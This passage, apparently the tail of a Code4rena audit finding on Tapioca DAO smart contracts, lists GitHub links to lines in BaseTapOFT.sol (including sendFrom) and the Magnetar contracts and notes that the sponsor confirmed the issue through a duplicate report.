<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L274>

`sendFrom`

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L229>

<https://github.com/Tapioca-DAO/tap-token-audit/blob/main/contracts/tokens/BaseTapOFT.sol#L312>

### MagnetarV2

<https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/main/contracts/Magnetar/MagnetarV2.sol#L268>

### MagnetarMarketModule

<https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/main/contracts/Magnetar/modules/MagnetarMarketModule.sol#L725>

</details>

**[0xRektora (Tapioca) confirmed via duplicate issue 841](https://github.com/code-423n4/2023-07-tapioca-findings/issues/841)**

